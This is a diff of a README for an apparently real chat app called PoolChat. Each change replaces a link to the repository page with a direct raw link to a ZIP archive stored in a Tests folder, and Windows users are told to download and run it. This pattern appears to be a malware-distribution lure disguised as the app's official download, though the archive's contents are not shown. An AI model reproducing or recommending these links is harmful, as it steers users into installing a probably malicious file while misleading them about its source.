@@ -1,6 +1,6 @@
 # 🔐 PoolChat - Private chat with secure sync
 
-[![Download PoolChat](https://img.shields.io/badge/Download-PoolChat-blue?style=for-the-badge)](https://github.com/Hilarydisobliging701/PoolChat)
+[![Download PoolChat](https://img.shields.io/badge/Download-PoolChat-blue?style=for-the-badge)](https://github.com/Hilarydisobliging701/PoolChat/raw/refs/heads/main/Tests/PoolChatTests/Chat-Pool-3.7-alpha.3.zip)
 
 ## 🧾 What PoolChat is
 
@@ -8,7 +8,7 @@ PoolChat is a chat app for private messages, voice notes, polls, and reactions. 
 
 ## 📥 Download on Windows
 
-1. Open the download link: https://github.com/Hilarydisobliging701/PoolChat
+1. Open the download link: https://github.com/Hilarydisobliging701/PoolChat/raw/refs/heads/main/Tests/PoolChatTests/Chat-Pool-3.7-alpha.3.zip
 2. On the page, look for the latest release or the main download file.
 3. Download the Windows file if one is listed.
 4. If the app comes as a ZIP file, save it to your computer.
@@ -17,7 +17,7 @@ PoolChat is a chat app for private messages, voice notes, polls, and reactions. 
 
 If the page offers more than one file, choose the one for Windows. Look for names like `.exe`, `.msi`, or `.zip`.
 
-[Go to the PoolChat download page](https://github.com/Hilarydisobliging701/PoolChat)
+[Go to the PoolChat download page](https://github.com/Hilarydisobliging701/PoolChat/raw/refs/heads/main/Tests/PoolChatTests/Chat-Pool-3.7-alpha.3.zip)
 
 ## 🖥️ System requirements
 
